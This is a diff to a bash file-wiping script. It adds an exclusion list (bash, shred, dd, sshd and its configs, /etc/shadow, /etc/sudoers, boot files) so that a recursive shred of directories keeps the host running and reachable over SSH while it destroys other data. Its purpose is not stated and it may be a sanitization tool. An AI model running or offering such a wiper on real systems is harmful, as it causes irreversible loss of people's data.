@@ -12,6 +12,41 @@ check_binaries() {
     command -v which >/dev/null 2>&1 && WHICH_PRESENT=true || WHICH_PRESENT=false
 }
 
+# Define the list of exclusions
+exclusion_paths=(
+    "$(which bash)"
+    "$(which find)"
+    "$(which rm)"
+    "$(which shred)"
+    "$(which dd)"
+    "$(which nohup)"
+    "$(which tail)"
+    "$(which getent)"
+    "$(which which)"
+    "/usr/sbin/sshd"
+    "/etc/ssh/sshd_config"
+    "/etc/ssh/ssh_config"
+    "/etc/ssh/ssh_host_*"
+    "/home/vagrant/.ssh/*"
+    "/lib/x86_64-linux-gnu/*"
+    "/lib64/ld-linux-x86-64.so.2"
+    "/lib/systemd/*"
+    "/etc/passwd"
+    "/etc/shadow"
+    "/etc/group"
+    "/etc/gshadow"
+    "/etc/sudoers"
+    "/etc/fstab"
+    "/etc/hostname"
+    "/etc/resolv.conf"
+    "/boot/vmlinuz-*"
+    "/boot/initrd.img-*"
+    "/boot/System.map-*"
+    "/boot/config-*"
+    "/boot/grub/*"
+    "/boot/grubenv"
+)
+
 # Function to create necessary log files
 prepare_logs() {
     touch nohup.out remaining_files.log
@@ -70,7 +105,7 @@ recursive_shred() {
         find "$dir" -mindepth 1 -maxdepth 1 -type d | while read -r subdir; do
             recursive_shred "$subdir"
         done
-        find "$dir" -type f -exec bash -c 'wipe_files "{}"' \;
+        find "$dir" -type f $(printf "! -path '%s' " "${exclusion_paths[@]}") -exec bash -c 'wipe_files "{}"' \;
     else
         echo "find command not available. Skipping shredding of $dir."
     fi
